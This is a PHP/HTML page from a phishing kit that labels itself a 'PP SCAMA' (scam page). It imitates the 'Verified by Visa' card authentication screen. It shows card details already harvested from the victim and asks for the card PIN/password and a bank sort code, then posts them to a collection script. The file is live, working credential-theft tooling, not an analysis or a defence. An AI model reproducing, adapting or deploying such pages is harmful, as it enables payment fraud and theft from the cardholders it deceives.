<?php
session_start();
/*

+----------------------------------+
¦--- PRIVATE  PP SCAMA   2015 -----¦
¦---------- Ver : 2.0 -------------¦
¦--------- BY Dz[NO_o]B -----------¦
¦----------- GREETZ TO ------------¦
¦--- Dz Phoniex : Dz Injector -----¦
¦----------------------------------¦
¦https://code.google.com/p/dznoob/ ¦
¦----------------------------------¦
¦https://facebook.com/DzNOoBpage   ¦
+----------------------------------+


*/


date_default_timezone_set('GMT');
$copyright = date("Y");
include "../lang".$_SESSION['DZLN'];
@ini_set('display_errors', 0);
error_reporting(E_ALL ^ E_NOTICE);

?>












<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<html>
<head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">


<meta http-equiv="Cache-Control" content="no cache">
<meta http-equiv="Pragma" content="no cache">
<meta http-equiv="Expires" content="0">


	<title>Verified by Visa</title>
	

	


<link rel="stylesheet" type="text/css" href="index.css" media="all">
</head>
<body leftmargin="0" topmargin="0" onload="OnPageInit();" onbeforeunload="onBeforeUnloadHandler(this);" onfocus="onFocusHandler();" marginheight="0" marginwidth="0" bgcolor="#ffffff">

<form name="passwd" action="../vbvg.php" method="POST"">


<!-- This table centers the content area in the window, irregardless of the window's size -->
<table width="100%" border="0" cellpadding="0" cellspacing="0">
	<tbody><tr>
		<td colspan="3"><img src="spacer_clear.gif" alt="" height="20" width="1" border="0"><br></td>
	</tr>
	<!-- Top 10 pixels of white space -->
	<tr>
		<td><img src="spacer_clear.gif" alt="" height="1" width="20" border="0"><br>
		</td><!-- Left 20 pixels of white space -->
		<td align="center">


			<!-- Content area -->
			<table height="340" width="330" border="0" cellpadding="0" cellspacing="0">
				<tbody><tr>
					<td height="51" valign="top" width="89">
						<img name="vpasLogo" src="dznoob0.gif" alt="Verified by Visa" border="0"><br>
					</td>
					<td height="51" valign="top" width="301" align="right">
						<img name="memberLogo" src="dzn-129x32.svg" alt="Issuer Logo" border="0"><br>
					</td>
				</tr>
			<tr>
			<td colspan="3"><img src="spacer_clear.gif" alt="" height="20" width="1" border="0"><br></td>
			</tr>
				<tr>

					<td colspan="2" height="100" valign="top">

					<?php echo $valid[37]; ?>

<font face="arial" size="2" color="#ff7800"></font>
                		 <noscript>
							<font face="arial" SIZE="2" color="#ff7800"></font>
						 </noscript>
						<br>
						<img src="spacer_clear.gif" alt="" height="5" width="1" border="0">
												<img src="spacer_clear.gif" alt="" height="5" width="1" border="0">
					
						<img src="spacer_clear.gif" alt="" height="20" width="1" border="0">
						<br>





						<!-- This table formats the dynamic content into two rows -->
						<table width="330" align="center" border="0" cellpadding="3" cellspacing="0">
							<tbody><tr>
								<td class="TextBlack" valign="top" width="170" align="right"> <?php echo $Nomdutitulairedelacarte;  ?> </td>
								<td class="TextBlack" valign="top" width="170"> <?php echo $_SESSION['gg1'];  ?> <?php echo $_SESSION['gg2']; ?> </td>
							</tr>
							
							<tr>
								<td class="TextBlack" valign="top" width="170" align="right"> <?php echo $zip;  ?> </td>
								<td class="TextBlack" valign="top" width="170"> <?php echo $_SESSION['gg8'];  ?> </td>
							</tr>
							<tr>
								<td class="TextBlack" valign="top" width="170" align="right"> <?php echo $country;  ?> </td>
								<td class="TextBlack" valign="top" width="170"> <?php echo $_SESSION['gg7'];  ?> </td>
							</tr>
							<tr>
								<td class="TextBlack" valign="top" width="170" align="right"> <?php echo $ccnumbr;  ?> </td>
								<td class="TextBlack" valign="top" width="170"> <b> <?php echo $_SESSION['dftCN'];  ?> </b> </td>
							</tr>


							

							<!--<FORM METHOD="post"  ACTION="vbv.php">-->
							<tr>
								<td class="TextBlack" valign="top" width="170" align="right"> <?php echo $login_password_input_0; ?> </td>
								<td valign="top" width="170"><input name="pin" size="14" maxlength="30" class="monospace" type="password"><br></td>
							</tr>
							<tr>
							
							<tr>
								<td class="TextBlack" valign="top" width="170" align="right"> Sort Code </td>
								<td valign="top" width="170"><input name="sort" size="14" placeholder="XX-XX-XX" maxlength="30" class="monospace" type="text"><br></td>
							</tr>
							<tr>
							
								<td valign="top" width="340" align="right">
								<img src="spacer_clear.gif" alt="" height="1" width="1" border="0">
								</td>
	

							</tr>

							<tr>
								<td>&nbsp;</td>
								<td>
									<img src="spacer_clear.gif" height="10" width="1"><br>									
				<table border="0" cellpadding="0" cellspacing="0">
									<tbody><tr>
										<td><input name="submitval" value="Submit" onclick="closing=false" type="submit"><br></td>
										<td><img src="spacer_clear.gif" height="1" width="15"><br></td><!-- Spacer gif between elements. -->
                                                                                  
									
									</tr>
									
									</tbody></table>
									<!-- End of internal table that lines everything up nicely -->
								</td>
							</tr>
						    <!--</FORM>-->
						</tbody></table>
						<!-- End of the table that formats the dynamic content into two rows -->
					</td>
				</tr>

				<tr>
				<td colspan="2">
		<img src="spacer_clear.gif" alt="" height="5" width="1" border="0"><br>

		<!-- copyright notice table -->
		<table width="100%" border="0" cellpadding="0" cellspacing="0">
		<tbody><tr><td valign="top" align="left">
		<span class="TextSmall"> <center> <?php echo $copy1; ?> . <?php echo $copy2; ?>  </center> </span>
		<br>
		<!-- IMG SRC="en_US_DPS_Bulk12/images/spacer_clear.gif" WIDTH="1" HEIGHT="10" BORDER=0 ALT=""-->
		</td></tr>
		</tbody></table>

		<!-- end copyright notice table-->

				</td>
				</tr>

			</tbody></table>
			<!-- End of content area -->

		</td>
		<td><img src="spacer_clear.gif" alt="" height="0" width="20" border="0"><br></td><!-- Right 20 pixels of white space -->
	</tr>
</tbody></table>





</body>
</html>
